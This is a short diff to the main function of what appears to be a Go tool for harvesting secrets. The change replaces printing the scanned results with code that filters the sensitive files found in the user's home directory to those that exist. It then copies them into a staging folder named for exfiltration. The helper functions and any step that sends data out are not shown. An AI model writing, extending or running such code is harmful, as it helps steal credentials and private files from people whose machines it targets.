@@ -16,6 +16,7 @@ func main() {
 	fmt.Println(exfilDirectory)
 
 	secrets := internals.ScanSensitiveFiles(exfilDirectory, usersHome, isRoot)
-	fmt.Println(secrets)
-	
+	accessibleFiles := internals.FilterExistingFiles(secrets)
+	// fmt.Println(accessibleFiles)
+	internals.CopyFiles(accessibleFiles, exfilDirectory)
 }
